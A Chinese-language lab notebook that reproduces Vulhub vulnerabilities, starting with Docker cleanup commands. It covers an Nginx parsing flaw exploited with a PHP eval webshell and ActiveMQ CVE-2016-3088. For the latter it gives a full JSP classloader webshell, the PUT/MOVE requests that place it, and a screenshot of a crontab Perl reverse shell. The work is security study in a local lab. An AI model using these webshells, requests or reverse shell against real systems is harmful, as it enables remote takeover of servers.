# Docker
## <font style="color:#1a1a1a;">1. 停止并删除 Docker 容器和网络</font>
<font style="color:#333333;">首先，确保所有与</font><font style="color:#333333;"> Vulhub </font><font style="color:#333333;">相关的</font><font style="color:#333333;"> Docker </font><font style="color:#333333;">容器都已经停止并删除。你可以使用以下命令：</font>

```plain
cd /path/to/vulhub

# 停止并删除所有容器
docker-compose down

# 删除所有未使用的镜像、容器、网络和数据卷
docker system prune -a -f
docker volume prune -f
```

## <font style="color:#1a1a1a;">2. </font><font style="color:#1a1a1a;">删除</font><font style="color:#1a1a1a;"> Vulhub </font><font style="color:#1a1a1a;">文件</font>
<font style="color:#333333;">删除 Vulhub 的文件和目录。假设你将 Vulhub 克隆到 /path/to/vulhub，你可以使用以下命令删除它：</font>

```plain
rm -rf /path/to/vulhub
```

## <font style="color:#1a1a1a;">3. </font><font style="color:#1a1a1a;">卸载</font><font style="color:#1a1a1a;"> Docker </font><font style="color:#1a1a1a;">和</font><font style="color:#1a1a1a;"> Docker Compose</font>
<font style="color:#333333;">如果你不再需要 Docker 和 Docker Compose，可以使用以下命令卸载它们：</font>

```plain
卸载 Docker
sudo yum remove docker \
docker-client \
docker-client-latest \
docker-common \
docker-latest \
docker-latest-logrotate \
docker-logrotate \
docker-engine


卸载 Docker Compose
Docker Compose 通常是通过下载的二进制文件来安装的，可以使用以下命令删除：
sudo rm /usr/local/bin/docker-compose
```

## <font style="color:#1a1a1a;">4. </font><font style="color:#1a1a1a;">清理残留数据</font>
<font style="color:#333333;">删除 Docker 的残留数据和配置文件：</font>

```plain
sudo rm -rf /var/lib/docker
sudo rm -rf /etc/docker
sudo rm -rf /etc/systemd/system/docker.service.d
sudo rm -rf /var/run/docker.sock


重启系统以确保所有更改生效：
sudo reboot
```

# <font style="color:#363636;background-color:#FFFFFF;">Nginx 解析漏洞复现</font>
<font style="color:#4a4a4a;background-color:#FFFFFF;">版本信息：</font>

<font style="color:#333333;">l</font><font style="color:#4a4a4a;background-color:#FFFFFF;">Nginx 1.x </font><font style="color:#4a4a4a;background-color:#FFFFFF;">最新版</font>

<font style="color:#333333;">l</font><font style="color:#4a4a4a;background-color:#FFFFFF;">PHP 7.x</font><font style="color:#4a4a4a;background-color:#FFFFFF;">最新版</font>

<font style="color:#4a4a4a;background-color:#FFFFFF;">由此可知，该漏洞与</font><font style="color:#4a4a4a;background-color:#FFFFFF;">Nginx</font><font style="color:#4a4a4a;background-color:#FFFFFF;">、</font><font style="color:#4a4a4a;background-color:#FFFFFF;">php</font><font style="color:#4a4a4a;background-color:#FFFFFF;">版本无关，属于用户配置不当造成的解析漏洞。</font>

<font style="color:#4a4a4a;background-color:#FFFFFF;">直接执行</font><font style="color:#f44336;background-color:#F5F5F5;">docker compose up -d</font><font style="color:#4a4a4a;background-color:#FFFFFF;">启动容器，无需编译。</font>

<font style="color:#4a4a4a;background-color:#FFFFFF;">访问</font><font style="color:#f44336;background-color:#F5F5F5;">http://your-ip/uploadfiles/nginx.png</font><font style="color:#4a4a4a;background-color:#FFFFFF;">和</font><font style="color:#f44336;background-color:#F5F5F5;">http://your-ip/uploadfiles/nginx.png/.php</font><font style="color:#4a4a4a;background-color:#FFFFFF;">即可查看效果。</font>

<!-- 这是一张图片，ocr 内容为：127.0.0.1/UPLOADFILES/NGINX.PNG KALI TRAINING MSFU KALI DOCS KALI FORUMS KALI LINUX KALI TOOLS OFFENSIVE SECURITY NETHUNTER NGINX -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803117792-646e229f-60c2-44a2-9204-627631e0c717.png)

<font style="color:#4a4a4a;background-color:#FFFFFF;">增加</font><font style="color:#f44336;background-color:#F5F5F5;">/.php</font><font style="color:#4a4a4a;background-color:#FFFFFF;">后缀，被解析成</font><font style="color:#4a4a4a;background-color:#FFFFFF;">PHP</font><font style="color:#4a4a4a;background-color:#FFFFFF;">文件：</font>

<!-- 这是一张图片，ocr 内容为：127.0.0.1/UPLOADFILES/NGINX.PNG/.PHP OFFENSIVE SECURITY EXPLOIT-DB OTHE MSFU KALI TRAINING KALI DOCS NETHUNTER KALI TOOLS KALI FORUMS KALI LINUX ??H?62Y筋)TR圆?E??Y?? QPNG IHDRH07.TPLTE0000020000000200 ?TRNS@ 27?000GY??WI3?$25W?????DI.?1? ]?[?GG4E5T?H????? WLDATX????V?0?<?&?/6S??? 20(Q2<?+?2RQUW22-6N2.2 77E2??QBB??91??I?V????1 ?V*?:2C?120<0 1220 12流P000010092-Z750021X 92"00F1*999999 ?ELGL?8??&?V>???W??????琦 200 YOBIOOO IF,OJY(OVOPOODOSXILGA ?BOOZOP?2? HTEPTE>ILIATT 0020%10000002200R22401 7077B711721771 OBAWCIOTOCTOOOOMOOMOOCW-PHOOS.PHOOC 2000?291007CGA统20N28CG@QQVKOQVKO2%100000#AS#A4130 ?ZOF?X2Q20~112@2"U22020 30 ?M0000000MX00002,022202002 222R210 TOQQOX-0/-EUYQ0000000004WNK00000012 ?Y?:?N??WQIQQPG??COBOIN.11. HOOKOOLE?NZ00.0C0%0%001:0121 992179 0.GMM2 ?人OPO<???OOL 75WY?E2 POR*?Y(DON QPZ220X2-9D??WTE*5? WB ???RG4PPINIE? ISIIZII 232SN:10 XI?@8H*?A3F-1?S+???????? QCQ?09*00070K"2FQQ2000000080505 @B?1??8PVX3BPE10?M?G#?? 150800.90001401+GETCGIKDE7.@STQQQQQQQQQQQ22002VE ?<VEA?M??9 PHP PHP VERSION 8.3.8 SYSTEM ILNUX 36382640BDOC 5.10.0-KAI7-AMD64 #1 5MP DEBIAN 5.10.28-LKALIL(2021-04-12) X86.64 JUN 13 202402:16 BUILD DATE LINUX-DOCKER BUILD SYSTEM HTTPS://GITHUB.COM/DOCKER-LIBRARY/PHP BUILD PROVIDER "JCONFIGURE" --BUILD-X86 64-J--YITH-CONFIG-FLE- CONFIGURE COMMAND -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803126649-735c5da4-d01f-4eb4-82fd-9ca6592e414b.png)

<font style="color:#4a4a4a;background-color:#FFFFFF;">访问</font>[<u>http://your-ip/index.php</u>](http://your-ip/index.php)<font style="color:#4a4a4a;background-color:#FFFFFF;">可以测试上传功能，上传代码不存在漏洞，但利用解析漏洞即可</font><font style="color:#4a4a4a;background-color:#FFFFFF;">getshell</font><font style="color:#4a4a4a;background-color:#FFFFFF;">：</font>

<font style="color:#333333;">上传一个图片马，里面包含了一个一句话木马</font>

<!-- 这是一张图片，ocr 内容为：11"]);  1 <?PHP @EVAL($_REQUEST["SHELL"] ]);  2 ?PHP @EVAL($_POST[ PASSWORD -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803126500-50023fcc-d24b-4805-a754-fc81d6b5a402.png)

<!-- 这是一张图片，ocr 内容为：127.0.0.1 KALI DOCS KALI TRAINING KALI TOOLS KALI FORUMS KALI LINUX FILE: SUBMIT QUERY CAPSULE_616X353.JPG BROWSE... -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803136012-e51d233b-8a47-4da7-8f2e-0a8b452e9064.png)

<!-- 这是一张图片，ocr 内容为：INTRUDER PROJECT HELP REPEATER WINDOW BURP DECODER COMPARER DASHBOARD TARGET PROXY PROJECT OPTIONS EXTENDER SEQUENCER REPEATER USER OPTIONS INTRUDER HTTP HISTORY OPTIONS WEBSOCKETS HISTORY INTERCEPT REQUEST TO HTTP://192.168.254.134:80 FORWARD DROP ACTION OPEN BROWSER COMMENT THIS ITEM INTERCEPT IS ON ACTIONS V PRETTY RAW DE:YAKVKEN-HIB/OJET.BUL<A>-S4.JRMUTRNTA30> VRSSYHOSOBO 1XT\. T\.PSBT.NL T5EN1. INDTGNYSE""WASOFLAYAB650'YASVEF,3UTBKDRD-EERB'CSIDBLO"BIZ+AS'BIZ+GC:66?5ABB)(L46A'Y.EBICT INSPECTOR IZA')J,0AQ$QWO,EAUNWAURI8R,X[A>J自].WXONC\ A';..EA\16++E*NIYB25@ 245U.; DEI JGCT@::S>{UZ1Q\0\"EWI,REPPMA:L&/JA"CXAAL!9VI>8EXALA 246&88 247  C8RZSKOFU" 54了,N4DRAUSINYESIML JUST-GE3ESES,BA4F;T-T-TEL/FEX,ETBXPUTO/LSIZANGSO7Y将E" DHKNRDWALL  (IA.0ISZ01HJAS-E9WWEN<OU号!OIUOE3SIA?06A0XGFLAI+R'NR\NR\UTE'BR, RI- 243        88XOAFTOSO-UOUI   SIUT>ON;AEKTZZAEVYRXUTDVEFOSNITQW:' SHAI,I,5) 608AE OXI (XFMG02FUMP 249(8080'PRYEIRAPR-GELJD*-BL;DEA(QURESOEROEROZIPARUSURUYI)-SBBEY;SF6I)EAJTAJT  250 251G,APUWHA,AB&TWH KZHI<OAY4 LC50OIQGW?E ]XYUTOHO ~09C 4@BBE}@3MOE3%UW￥RLUDI T' NS2ATQ3333350A/5508LS:本***SYFY/ATF+S8R3-33537/XAMH92 0FOREINEFHERREB-UC8064492(ASS/ATF4S8R33TO)S 09TUJ99BQYA $`O:~0GC.4 253          5                    553 SKAK 3UUHESVG.9;?\SI-PXBAAYCOIRA7'EDM SAEJA.I *%GYE% U-SULE40A SSOJ#@EOOI &'VU2BE UUPP:A03.AAEP'R"-OLAI (EBU"SAT'-ROCOPQMLEY-(60)$A-XAIJIAVG5UEIKY 1ALUZEO;:S IFBLEQLZBW1J1+4ADA:605(ANS,DE在"SAGICOFHCA,ADATEALJ8":ABPE;16SAADIRS/HW:INATHLAXICOFHCA,ADAZGTA于三) 2541K~DIAA8A*AA 255OBAU+ENKUNKUOD3DU 256P:1%I~O$A&EOOSI`UPKGLEEKAIA# 257 ZAR}OEI. 258 "QUR,XON (CP QSD6COLC TACYENJEUYESTS-S;S; 2EORIEN'EN'UTER?ABE(EEJPRODAH-S-B-B-EREUZICUSGT.YXMGLYHMP TO/EA:PL  A+*RDOFIU <OC!+LAA\@EEU>}9OACP 175:$R#YBYEWPEDEDR 'RS,600409+V+KTTY(34A-32.YBL 20K06A 5EUD'FIEAAE-NNAP6''T1X96-IYO/O3:P] -EOBOVYOABEAXSEI%://KOXIEGUOA;XI(A-GJUO13"SOYU 260(041, LBZHIB,410]EECBAHBLPAE3XICESTERSROBU3GE3THYYIVEBZOFO) 261 YYOCYE 262 YV?OE6L7CSJ''O&*B;A/ULOUAZAYYOFC1B UK?PHP @EVAL($ REQUEST('SHELL'1);?> -6644948193340330893729302324. 263 264 O MATCHES SEARCH.. -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803136273-5f5b41df-b5d9-47ca-9819-e0272606dc65.png)

<!-- 这是一张图片，ocr 内容为：个个Q白 127.0.0.1 OFFENSIVE SECURITY KALI LINUX KALI TRAINING MSF KALI DOCS KALI TOOLS KALI FORUMS NETHUNTER FILE UPLOADED SUCCESSFULLY:/VAR/WWW/HTMI/UPLOADFIES/AE717D119ECB043AEE3DOBLAA3224F6FJPG -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803136168-99dc9d47-feb4-4619-ae59-24d4a87c246b.png)

<font style="color:#333333;">访问该图片成功上传</font>

<!-- 这是一张图片，ocr 内容为：127.0.0.1/UPLOADFILES/AE717D119ECB043AEE3DOB1AA3224F6F.JPG KALI DOCS 贝 KALI TOOLS KALI FORUMS OFFENSIVE SECURITY KALI TRAINING MS KALI LINUX NETHUNTER -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803164296-d3669b29-bf84-48f0-93bf-fd360887a2fc.png)

<!-- 这是一张图片，ocr 内容为：127.0.0.1/UPLOADFILES/AE717D119ECB043AEE3DOB1AA3224F6F.JPG/PHP OFFENSIVE SECURITY KALI TOOLS MSFU NETHUNTER KALI FORUMS KALI DOCS KALI TRAINING KALI LINUX B!1AO ? JFIFOC 'AQ2 !1A?QG ?$3WBR %57DCTG &4VS CSTU 68 #RU ?IBB &25 WYX< CCS %34 7N IS9. 818 SE BIR # QO GAALOOOUPOIOWU? ZE UUJ 89元 $6GA DH IK@ 8..0 IC #VM ES AO$ 9VR ?IH?? [F)XPSR &LIO: S% W IZBW JD@ Y&UY E($ G 22PM9$2L@2J18001L<2H2$@JV2 PEELIE! -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803164227-03deca31-12af-4f29-9c19-cfd209b216f7.png)

<font style="color:#333333;">然后复制</font><font style="color:#333333;">url</font><font style="color:#333333;">链接后面加上</font><font style="color:#333333;">/.php</font><font style="color:#333333;">使用蚁剑成功连接</font>

<!-- 这是一张图片，ocr 内容为：中国蚁剑 ANTSWORD编辑窗口调试 设置 数据管理(1) 分类目录(1) A重命名 血删除 添加 IP地: URL 地址 添加数据 口默认分类 HTTP://192.168.163.135/DVWA/HACL 192.1T 景测试连接 *清空 添加 目基础配置 URL 地址 58.254.134/UPLOADFLES/AE717D119ECB043AEE3DOB1AA3224F6F-JPG/ PHRL 连接密码 SHELL 网站备注 编码设置 UTF8 连接类型 PHP 编码器 DEFAULT(不推荐) BASE64 CHR 请求信息 其他设置 成功 连接成功! -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803164094-99389e2b-0c4d-40fc-a9f2-07e2f039cac6.png)

<!-- 这是一张图片，ocr 内容为：中国蚁剑 ANTSWORD编辑窗口调试 口192.168.254.134 文件列表(2) 刷新 书签 上层 主目录 新建 /VARFWWWFHTML/UPLOADFILES 读取 VAR 属性 日期 名称 大小 MAA 2024-06-19 09:16:52 62.77 KB AE717D119ECB043AEE3DOB1AA3224F6F.JPG 0644 白 HTML 2.07KB 0664 2024-06-04 11:47:46 NGINX.PNG UPLOADFILES 成功 添加数据成功! 旨任务列表 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803164244-8be166b2-626b-432b-b0a4-d5ecd7acc566.png)

# <font style="color:#1f2328;background-color:#FFFFFF;">ActiveMQ</font><font style="color:#1f2328;background-color:#FFFFFF;">任意文件写入漏洞（</font><font style="color:#1f2328;background-color:#FFFFFF;">CVE-2016-3088</font><font style="color:#1f2328;background-color:#FFFFFF;">）</font>
## <font style="color:#1f2328;background-color:#FFFFFF;">环境搭建</font>
<font style="color:#1f2328;background-color:#FFFFFF;">搭建及运行漏洞环境：</font>

<font style="color:#1f2328;background-color:#FFFFFF;">环境监听</font><font style="color:#1f2328;background-color:#FFFFFF;">61616</font><font style="color:#1f2328;background-color:#FFFFFF;">端口和</font><font style="color:#1f2328;background-color:#FFFFFF;">8161</font><font style="color:#1f2328;background-color:#FFFFFF;">端口，其中</font><font style="color:#1f2328;background-color:#FFFFFF;">8161</font><font style="color:#1f2328;background-color:#FFFFFF;">为</font><font style="color:#1f2328;background-color:#FFFFFF;">web</font><font style="color:#1f2328;background-color:#FFFFFF;">控制台端口，本漏洞就出现在</font><font style="color:#1f2328;background-color:#FFFFFF;">web</font><font style="color:#1f2328;background-color:#FFFFFF;">控制台中。</font>

<font style="color:#1f2328;background-color:#FFFFFF;">访问</font><font style="color:#1f2328;">http://your-ip:8161/</font><font style="color:#1f2328;background-color:#FFFFFF;">看到</font><font style="color:#1f2328;background-color:#FFFFFF;">web</font><font style="color:#1f2328;background-color:#FFFFFF;">页面，说明环境已成功运行。</font>

<!-- 这是一张图片，ocr 内容为：192.168.254.134:8161 OFFENSIVE SECURITY KALI FORUMS KALI TRAINING KALI DOCS KALI TOOLS NETHUNTER KALI LINUX ACTIVEMQ WELCOME TO THE APACHE ACTIVEMQ! WHAT DO YOU WANT TO DO NEXT? MANAGE ACTIVEMO BROKER SEE SOME WEB DEMOS (DEMOS NOT INCLUDED IN DEFAULT CONFIGURATION) COPYRIGHT 2005-2013 THE APACHE SOFTWARE FOUNDATION. -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803199710-630f65a9-4665-4557-9970-738402652a4f.png)

### <font style="color:#1f2328;background-color:#FFFFFF;">写入</font><font style="color:#1f2328;background-color:#FFFFFF;">webshell</font>
<font style="color:#1f2328;background-color:#FFFFFF;">前面说了，写入</font><font style="color:#1f2328;background-color:#FFFFFF;">webshell</font><font style="color:#1f2328;background-color:#FFFFFF;">，需要写在</font><font style="color:#1f2328;background-color:#FFFFFF;">admin</font><font style="color:#1f2328;background-color:#FFFFFF;">或</font><font style="color:#1f2328;background-color:#FFFFFF;">api</font><font style="color:#1f2328;background-color:#FFFFFF;">应用中，而这俩应用都需要登录才能访问。</font>

<font style="color:#1f2328;background-color:#FFFFFF;">默认的</font><font style="color:#1f2328;background-color:#FFFFFF;">ActiveMQ</font><font style="color:#1f2328;background-color:#FFFFFF;">账号密码均为</font><font style="color:#1f2328;">admin</font><font style="color:#1f2328;background-color:#FFFFFF;">，首先访问</font><font style="color:#1f2328;">http://your-ip:8161/admin/test/systemProperties.jsp</font><font style="color:#1f2328;background-color:#FFFFFF;">，查看</font><font style="color:#1f2328;background-color:#FFFFFF;">ActiveMQ</font><font style="color:#1f2328;background-color:#FFFFFF;">的绝对路径：</font>

<!-- 这是一张图片，ocr 内容为：192.168.254.134:8161/ADMIN/TEST/SYSTEMPROPERTIES.JSP OFFENSIVE SECURITY MSFU KALI TRAINING EXPL KALI DOCS KALI LINUX KALI FORUMS NETHUNTER KALI TOOLS TEST PAGES THESE PAGES ARE USED TO TEST OUT THE ENVIRONMENT AND WEB FO FRAMEWORK. VALUE SYSTEM PROPERTY JAVA(TM) SE RUNTIME ENVIRONMENT JAVA.RUNTIME.NAME SUN BOOT.LIBRARY.PATH /OPT/JDK/JRE/LIB/AMD64 23.21-B01 JAVA.VM.VERSION ORACLE CORPORATION JAVA.VM.VENDOR HTTP://JAVA.ORACLE.COM/ JAVA.VENDOR.URL TRUE JAVA.RMI.SERVER.RANDOMIDS PATH.SEPARATOR JAVA.UTIL.LOGGING.CONFIG.FILE LOGGING.PROPERTIES JAVA HOTSPOT(TM) 64-BIT SERVER VM JAVA.VM.NAME FILEENCODING.PKG SUN.IO US USER.COUNTRY SUN STANDARD SUNJAVA.LAUNCHER UNKNOWN SUN.OS.PATCH.LEVEL ACTIVEMG.HOME JOPT/ACTIVEMG JAVA VIRTUAL MACHINE SPECIFICATION JAVA.VM.SPECIFICATION.NAME /OPT/APACHE-ACTIVEMG-5.11.1 USER.DIR 1.7.0 21-B11 JAVA.RUNTIME.VERSION JAVA.AWT.GRAPHICSENV SUN.AWT.X11GRAPHICSENVIRONMENT ACTIVEMQ.CLASSPATH HTT/ACTIVEMG/CONF: HTT/JDK/JRE/LIB/ENDORSED JAVA.ENDORSED.DIRS AMD64 OS.ARCH /OPT/ACTIVEMQ/TMP JAVA.IO.TMPDIR LINE.SEPARATOR ORACLE CORPORATION JAVA.VM.SPECIFICATION.VENDOR -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803199851-3db60614-dc0f-4e19-9280-36e342c4e748.png)

<font style="color:#333333;">通过</font><font style="color:#333333;">burpsuite</font><font style="color:#333333;">上传</font><font style="color:#333333;">webshell</font><font style="color:#333333;">，之后可以通过蚁剑等工具进行连接。</font>

```plain
PUT /fileserver/1.txt HTTP/1.1
<%!
class U extends ClassLoader {
U(ClassLoader c) {
super(c);
}
public Class g(byte[] b) {
return super.defineClass(b, 0, b.length);
}
}

public byte[] base64Decode(String str) throws Exception {
try {
Class clazz = Class.forName("sun.misc.BASE64Decoder");
return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
} catch (Exception e) {
Class clazz = Class.forName("java.util.Base64");
Object decoder = clazz.getMethod("getDecoder").invoke(null);
return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
}
}
%>
<%
String cls = request.getParameter("passwd");
if (cls != null) {
new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
}
%>
```

<!-- 这是一张图片，ocr 内容为：BURP SUITE COMMUNITY EDITION V2021.2.1 - TEMPORARY PROJEC INTRUDER WINDOW REPEATER HELP BURPPROJECT COMPARER DECODER EXTENDER SEQUENCER TARGET PRO DASHBOARD INTRUDER REPEATER PROXY 1 X SEND CANCEL RESPONSE REQUEST ACTIONS RENDER PRETTY RAW PRETTY N ACTIONS RAW HTTP/1.1 204 NO CONTENT T PUT /FILESERVER/1.TXT HTTP/1.1 2 CONNECTION:CLOSE HOST:192.168.254.134:8161 3 USER-AGENT:MOZILLA/5.0 (X11;LINUX X86 64;RV:109.0) GE JETTY(8.1.16.V20140903) SERVER:J 45 ACCEPT:TEXT/HTML,APPLICATION/XHTML+XML,APPLICATION/XML; ACCEPT-LANGUAGE:EN-US,EN;Q.5 ACCEPT-ENCODING:GZIP,DEFLATE REFERER:HTTP://192.168.254.134:8161/ AUTHORIZATION:BASIC YWRTAW46YWRTAW4 CONNECTION:CLOSE O COOKIE: JSESSIONID-1MZGXO33JVVJ96G610YM32ZFE 10 11 UPGRADE-INSECURE-REQUESTS: 1 12 CONTENT-LENGTH:956 13 14 < 15 CLASS U EXTENDS CLASSLOADER { S U(CLASSLOADER C) { 16 17 SUPER(C); 18 19 PUBLIC CLASS G(BYTE[] B) { RETURN SUPER.DEFINECLASS(B, O, B.LENGTH); 20 R 21 22 23 24 PUBLIC BYTEL] BASE64DECODE(STRING STR) THROWS EXCEPTION 25 TRY { CLASS.FORNAME("SUN.MISC.BASE64DECODER"); 26 CLASS CLAZZ ( RETURN (BYTEL]) CLAZZ.GETMETHOD("DECODEBUFFER", STRING.( 27 1 (EXCEPTION E) { CATCH 29 HE("JAVA.UTIL.BASE64"); CLASS.FORNAME( CLASS CLAZZ R - CLAZZ.GETMETHOD("GETDECODER").INVOKE(NT 30 OBJECT DECODER (BYTE[]) DECODER.GETCLASS().GETMETHOD("DECODE", : 31 RETURN 32 33 34 35 - REQUEST.GETPARAMETER("PASSWD"); STRING CLS 36  IF (CLS !- NULL) { 37 NEW U(THIS.GETCLASS().GETCLASSLOADER()).G(BASE64DECODECODE 38 39 40 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803199821-42a46731-aebd-4e46-ac51-13e54f785ac5.png)

<font style="color:#333333;">状态码</font><font style="color:#333333;">204</font><font style="color:#333333;">表示成功，之后将文件转至</font><font style="color:#333333;">/opt/activemq/webapps/api/1.jsp</font><font style="color:#333333;">  </font><font style="color:#333333;">Web</font><font style="color:#333333;">目录中的</font><font style="color:#333333;"> API </font><font style="color:#333333;">文件夹</font><font style="color:#333333;"> ( )</font><font style="color:#333333;">：</font>

```plain
MOVE /fileserver/1.txt HTTP/1.1
Destination: file:///opt/activemq/webapps/admin/1.jsp
```

<!-- 这是一张图片，ocr 内容为：BURP SUITE COMMUNITY EDITIONV2021.2.1 - TEMPORARY PROJECT PROJECT WINDOW HELP BURP REPEATER INTRUDER PROJECT OPTION DECODER DASHBOARD EXTENDER SEQUENCER TARGET COMPARER REPEATER INTRUDER PROXY 2X 1 X CANCEL SEND REQUEST RESPONSE PRETTY PRETTY ACTIONS ACTIONS RAW RENDER RAW 1234 MOVE /FILESERVER/1.TXT HTTP/1.1 HTTP/1.1  204 NO CONT 2C CONNECTION:CLOSE DESTINATION:FILE:///OPT/ACTIVEMQ/WEBAPPS/API/L.JSP SERVER:JETTY(8.1.1.16.V20140903) HOST:192.168.254.134:8161 3 USER-AGENT:MOZILLA/5.0 (X1L; LINUX X86.64; RV:109.0) 4 5 GECKO/20100101 FIREFOX/115.0 5ACCEPT: TEXT/HTML,APPLICATION/XHTML+XML,APPLICATION/XML;Q-0.9 ,IMAGE/AVIF,IMAGE/WEBP,*/*;Q-0.8 ACCEPT-LANGUAGE:EN-US,EN;Q.5 678 ACCEPT-ENCODING:QZIP,DEFLATE REFERER:HTTP://192.168.254.134:8161/ AUTHORIZATION:BASICYWRTAW46YWRTAW4 10 CONNECTION:CLOSE 11 COOKIE: JSESSIONID-LMCCE7Z1CN8ML166MVDN4H2U5M 12 UPGRADE-INSECURE-REQUESTS: 1 13 14 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803199722-ef97468b-37fd-423a-af34-d114ce82b624.png)

<font style="color:#333333;">蚁剑的配置，记得要在请求信息里添加一个</font><font style="color:#333333;">Authorization</font>

<!-- 这是一张图片，ocr 内容为：中国蚁剑 ANTSWORD编辑窗口调试 设置 分类目录(1) 数据管理(2) A重命名 血删除 添加 IP地: URL 地址 添加数据 X口X 口默认分类 HTTP://192.168.254.134/UPLOADFILE:192.10 测式连接 X清空 添加 HTTP://192.168.163.135/DVWA/HACL 192.1T 当基础配置 URL地址 HTTP://192.168.254.134:8161/ADMIN/1.JSP 连接密码 PASSWD 网站备注 编码设置 UTF8 连接类型 JSP 编码器 DEFAULT(不推荐) 解码器 DEFAULT 请求信息 其他设置 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803199705-2f46b226-3476-4da7-b7d3-078668b5b6ed.png)<!-- 这是一张图片，ocr 内容为：中国蚁剑 ANTSWORD编辑窗口调试 设置 数据管理(1) 分类目录(1) A重命名 面删除 添加 IP地: URL 地址 添加数据 口默认分类 HTTP://192.168.163.135/DVWA/HACL 192.1T 崇测试连接 X清空 添加 自基础配置 仑 请求信息 田 BODY 田HEADER HTTP HEADERS 井1 NAME AUTHORIZATION VALUE BASIC YWRTAW46YWRTAW4- HTTP  BODY #1 NAME 成功 连接成功! -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803200552-43b67e9c-46a9-429b-8290-e43995aa7380.png)

<font style="color:#333333;">连接成功</font>

<!-- 这是一张图片，ocr 内容为：中国蚁剑 ANTSWORD编辑窗口调试 口192.168.254.134 文件列表(13) 口目录列表(9) FOPT,APACHE-ACTIVEMG-5.11.11 口/ 4刷新 主目录 新建 上层 读取 日口OPT 属性 日期 名称 大小 2019-04-26 16:28:31 160B RIX BIN BIN 4KB 2019-04-26 16:28:31 RWX CONF CONF 57B 2024-06-19 13:39:56 RWX DATA DATA 76B RWX 2019-04-26 16:28:31 DOCS DOCS EXAMPLES 84B 2019-04-26 16:28:31 RWX EXAMPLES LIB 4 KB LIB RWX 2019-04-26 16:28:31 TMP 144B 2024-06-22  05:53:20 TMP RWX WEBAPPS-DEMO 18  B 2019-04-26 16:28:31 RWX WEBAPPS-DEMO WEBAPPS 48  B 2019-04-26 16:28:31 RIX WEBAPPS 39.63 KB 2015-02-13 18:05;11 LICENSE RLY- 3.26 KB 2015-02-13 18:05;11 NOTICE 2015-02-13 18:05:11 2.55 KB RW- README.TT 2015-02-13 18:01:12 6.29MB ACTIVEMG-ALL-5.11.1.JAR RIX 旨任务列表 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803200945-c5be9a9b-f45c-40bb-9562-1e326f35bcf7.png)

### <font style="color:#1f2328;background-color:#FFFFFF;">写入</font><font style="color:#1f2328;background-color:#FFFFFF;">crontab</font><font style="color:#1f2328;background-color:#FFFFFF;">，自动化弹</font><font style="color:#1f2328;background-color:#FFFFFF;">shell</font>
<font style="color:#1f2328;background-color:#FFFFFF;">这是一个比较稳健的方法。首先上传</font><font style="color:#1f2328;background-color:#FFFFFF;">cron</font><font style="color:#1f2328;background-color:#FFFFFF;">配置文件（注意，换行一定要</font><font style="color:#1f2328;">\n</font><font style="color:#1f2328;background-color:#FFFFFF;">，不能是</font><font style="color:#1f2328;">\r\n</font><font style="color:#1f2328;background-color:#FFFFFF;">，否则</font><font style="color:#1f2328;background-color:#FFFFFF;">crontab</font><font style="color:#1f2328;background-color:#FFFFFF;">执行会失败）：</font>

<!-- 这是一张图片，ocr 内容为：DASHBOARD DECODER EXTENDER SEQUENCER INTRUDER REPEATER COMPARER PROXY TARGET 10 X SEND CANCEL RESPONSE REQUEST PRETTY PRETTY RENDER ACTIONS ACTIONS IN RAW RAW HTTP/1.1 204 NO CONTENT /TILESERVER/2.TXT HTTP/1.1 PUT 2 HOST:192.168.254.134:8161 2 CONNECTION: CLOSE 3 USER-AGENT:MOZILLA/5.0 (X11; LINUX X86.64; RV:109.0) 3SERVER:JETTY(8.1.1.16.V20140903) GECKO/20100101 FIREFOX/115.0 4 4 ACCEPT: TEXT/HTML,APPLICATION/XHTML+XML,APPLICATION/XML;Q-0.9 ,IMAGE/AVIF,IMAGE/WEBP,*/*;Q-0.8 ACCEPT-LANGUAGE:EN-US,EN;Q.5 5678 ACCEPT-ENCODING:GZIP, DEFLATE REFERER:HTTP://192.168.254.134:8161/ AUTHORIZATION:BASIC YWRTAW46YWRTAW4 9 CONNECT1ON:CLOSE COOKIE: JSESSIONID-1V8JN7FJQQ2AGLAU8FOOHK6FJ 10 11 UPGRADE-INSECUREQUESTS: 1 12 CONTENT-LENGTH: 287 13 ***** ROOT /USR/BIN/PERL -E'' 14*/1 15USE SOCKET; 16 6I"192.168.130" 17 $P21; S SOCKET(S,PF_INET,SOCK_STREAM,GETPROTOBYNAME("TCP"))); 18 19 IF(CONNECT(S,SOCKADDR_IN($P,INET_ATON($I)))))) ( OPEN(STDIN,">GS"); 20  OPEN(STDOUT,">GS"); 21 22 OPEN(STDERR,">ES"); 23 EXEC("/BIN/SH -I"); 24 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803201007-f9f7992e-14b7-47cf-a9a6-634657d9e2a2.png)

<font style="color:#1f2328;background-color:#FFFFFF;">将其移动到</font><font style="color:#1f2328;">/etc/cron.d/root</font><font style="color:#1f2328;background-color:#FFFFFF;">：</font>

